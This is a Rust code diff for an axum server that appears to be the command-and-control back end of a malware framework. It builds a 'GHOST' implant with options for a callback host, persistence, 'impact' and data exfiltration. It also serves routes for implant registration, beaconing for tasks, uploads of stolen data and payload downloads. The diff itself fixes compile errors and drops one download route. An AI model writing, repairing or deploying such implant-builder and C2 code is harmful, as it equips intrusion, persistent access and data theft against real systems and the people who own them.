@@ -6,9 +6,9 @@ use axum::{
 use dashmap::DashMap;
 use serde::{Deserialize, Serialize};
 use std::sync::Arc;
-use uuid::Uuid;
 use std::process::Stdio;
 use tokio::process::Command;
+use uuid::Uuid;
 use tower_http::services::ServeDir;
 
 // === ENUMS ===
@@ -303,16 +303,16 @@ async fn handle_charon_build(
     let source_path = std::env::var("GHOST_SOURCE_PATH").unwrap_or("/usr/src/GHOST".to_string());
     let build_dir = format!("home/shadowuser/builds/{}", build_id); // TODO: make this not exclusive to docker
 
-    tokio::fs::create_dir_all(&build_dir).await.mapp_err(|e| format!("fs error: {}", e))?;
+    tokio::fs::create_dir_all(&build_dir).await.map_err(|e| format!("fs error: {}", e))?;
 
     let mut args = vec![
         source_path,
         format!("-DSHADOW_URL={}", req.target_url),
         format!("-DSHADOW_PORT={}", req.target_port),
         format!("-DENABLE_DEBUG={}", if req.enable_debug { "ON" } else { "OFF" }),
-        format!("-DENABLE_PERSISTENCE={}", if req.enable_persistence { "ON" } else { "OFF" })),
-        format!("-DENABLE_IMPACT={}", if req.enable_impact { "ON" } else { "OFF" })),
-        format!("-DENABLE_EXFIL={}", if req.enable_exfil { "ON" } else { "OFF" })),
+        format!("-DENABLE_PERSISTENCE={}", if req.enable_persistence { "ON" } else { "OFF" }),
+        format!("-DENABLE_IMPACT={}", if req.enable_impact { "ON" } else { "OFF" }),
+        format!("-DENABLE_EXFIL={}", if req.enable_exfil { "ON" } else { "OFF" }),
     ];
 
     if req.enable_persistence {
@@ -332,7 +332,7 @@ async fn handle_charon_build(
     }
 
     println!("runnin cmake in {}", build_dir);
-    match cmake_output = Command::new("cmake")
+    let cmake_output = Command::new("cmake")
         .current_dir(&build_dir)
         .args(&args)
         .stdout(Stdio::piped())
@@ -342,13 +342,13 @@ async fn handle_charon_build(
         .map_err(|e| format!("cmake failed {}", e))?;
 
     if !cmake_output.status.success() {
-        let err_msg = String::From_utf8_lossy(&cmake_output.stderr);
+        let err_msg = String::from_utf8_lossy(&cmake_output.stderr);
 
         return Err(format!("cmake failed {}", err_msg));
     }
 
     println!("running make in {}", build_dir);
-    match make_output = Command::new("make")
+    let make_output = Command::new("make")
         .current_dir(&build_dir)
         .arg("-j4")     // multithread, why not
         .stdout(Stdio::piped())
@@ -358,7 +358,7 @@ async fn handle_charon_build(
         .map_err(|e| format!("make failed {}", e))?;
 
     if !make_output.status.success() {
-        let err_msg = String::From_utf8_lossy(&make_output.stderr);
+        let err_msg = String::from_utf8_lossy(&make_output.stderr);
 
         return Err(format!("make failed {}", err_msg));
     }
@@ -376,7 +376,6 @@ pub fn app(state: Arc<ServerState>) -> Router {
     let ghost_routes = Router::<Arc<ServerState>>::new()
         .route("/register", post(handle_ghost_register))        // ghost init (register)
         .route("/heartbeat", post(handle_ghost_heartbeat))      // ghosts will beacon to get tasks from here (or will just beacon their status and get back whether or not they have a task; smth to think about)
-        .route("/files/{id}", get(handle_ghost_file_download))  // payload/implant download point
         .route("/upload", post(handle_ghost_upload))            // exfiltration endpoint for data dumps
         .nest_service("/download", serve_dir);
 
